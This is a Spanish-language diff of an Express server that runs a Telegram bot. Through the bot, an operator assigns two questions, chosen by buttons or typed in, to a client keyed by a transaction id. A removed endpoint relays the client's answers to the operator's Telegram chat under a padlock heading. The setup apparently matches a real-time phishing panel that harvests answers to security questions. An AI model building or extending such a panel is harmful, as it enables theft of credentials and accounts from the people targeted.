@@ -98,7 +98,6 @@ app.post('/enviar', async (req, res) => {
 });
 
 app.post('/webhook', async (req, res) => {
-  // 🔘 Manejo de botones
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     const partes = callback.data.split(":");
@@ -125,7 +124,6 @@ app.post('/webhook', async (req, res) => {
         keyboardPreguntas.inline_keyboard.push(fila);
       }
 
-      // Botón para pregunta personalizada
       keyboardPreguntas.inline_keyboard.push([
         { text: "📝 Pregunta personalizada", callback_data: `custom_question:${txid}` }
       ]);
@@ -200,7 +198,6 @@ app.post('/webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // 📝 Manejo de mensajes personalizados
   if (req.body.message) {
     const message = req.body.message;
     const chatId = message.chat.id;
@@ -212,65 +209,46 @@ app.post('/webhook', async (req, res) => {
     const cliente = clientes[txid];
     if (!cliente) return res.sendStatus(200);
 
-    if (!cliente.preguntas.includes(text)) {
-      if (cliente.preguntas.length < 2) {
-        cliente.preguntas.push(text);
-      }
+    if (!cliente.preguntas.includes(text) && text.trim().length > 0) {
+      cliente.preguntas.push(text.trim());
     }
 
     cliente.estado_custom = false;
 
     if (cliente.preguntas.length === 2) {
       cliente.status = 'preguntas';
+      guardarEstado();
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `✅ Pregunta personalizada guardada: "${text}"
+
+Preguntas actuales para ${txid}:
+1️⃣ ${cliente.preguntas[0]}
+2️⃣ ${cliente.preguntas[1]}`
+        })
+      });
+    } else {
+      guardarEstado();
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `✅ Pregunta personalizada guardada: "${text}"
+
+1️⃣ ${cliente.preguntas[0]}
+❗ Aún falta una pregunta más.`
+        })
+      });
     }
-
-    guardarEstado();
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: `✅ Pregunta personalizada guardada: "${text}"\n\nPreguntas actuales para ${txid}:\n1️⃣ ${cliente.preguntas[0]}\n2️⃣ ${cliente.preguntas[1] || 'Esperando segunda'}`
-      })
-    });
 
     return res.sendStatus(200);
   }
-
-  res.sendStatus(200);
-});
-
-app.post('/enviar-preguntas', async (req, res) => {
-  const { txid, respuestas } = req.body;
-  const cliente = clientes[txid];
-
-  if (!cliente || !cliente.preguntas || cliente.preguntas.length !== 2) {
-    return res.status(400).send("Datos incompletos");
-  }
-
-  const mensaje = `
-🔐 PREGUNTAS RESPONDIDAS - ID: <code>${txid}</code>
-
-🟡 ${cliente.preguntas[0]}
-✏️ ${respuestas[0]}
-
-🟡 ${cliente.preguntas[1]}
-✏️ ${respuestas[1]}
-`;
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML'
-    })
-  });
-
-  cliente.status = "completo";
-  guardarEstado();
 
   res.sendStatus(200);
 });
